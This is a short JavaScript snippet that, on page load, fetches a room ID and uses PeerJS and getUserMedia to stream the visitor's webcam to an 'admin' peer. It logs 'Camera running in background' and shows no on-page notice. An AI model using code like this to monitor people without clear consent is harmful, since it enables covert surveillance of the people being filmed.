document.addEventListener("DOMContentLoaded", function () {
    fetch("get_room.php") 
        .then(response => response.json())
        .then(data => {
            if (data.room_id) {
                joinRoom(data.room_id); 
            }
        })
        .catch(error => console.error("Error fetching room:", error));
});

function joinRoom(room_id) {
    let peer = new Peer(); 

    peer.on("open", (id) => {
        console.log("User connected with Peer ID:", id);

        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then((stream) => {
                console.log("Camera running in background");

                let call = peer.call(room_id, stream); 
                call.on("stream", (remoteStream) => {
                    console.log("Receiving admin's stream");
                });

            })
            .catch((err) => {
                console.error("Error accessing camera:", err);
            });
    });

    peer.on("error", (err) => {
        console.error("PeerJS Error:", err);
    });
}
